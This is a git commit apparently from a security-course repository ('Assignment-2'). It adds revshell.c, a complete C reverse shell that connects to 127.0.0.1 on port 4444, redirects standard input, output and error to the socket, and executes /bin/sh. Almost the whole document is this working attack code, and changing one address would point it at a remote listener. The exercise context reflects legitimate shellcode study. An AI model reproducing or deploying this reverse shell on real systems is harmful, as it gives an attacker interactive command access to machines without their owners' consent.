360a10c25ddf9ded8dfe8d164106636b1fa3eb4a
Daniel Roberson <daniel@planethacker.net>
2017-04-23 20:04:09 -0700

    initial commit

---
+++ Assignment-2/revshell.c
@@ -0,0 +1,26 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+
+int main() {
+  int s;
+  struct sockaddr_in c; // client address
+
+
+  c.sin_family = AF_INET;
+  c.sin_port = htons (4444);
+  c.sin_addr.s_addr = inet_addr ("127.0.0.1");
+
+  s = socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
+
+  connect (s, (struct sockaddr *)&c, sizeof (c));
+
+  dup2 (s, STDERR_FILENO);
+  dup2 (s, STDOUT_FILENO);
+  dup2 (s, STDIN_FILENO);
+
+  execve ("/bin/sh", NULL, NULL);
+}
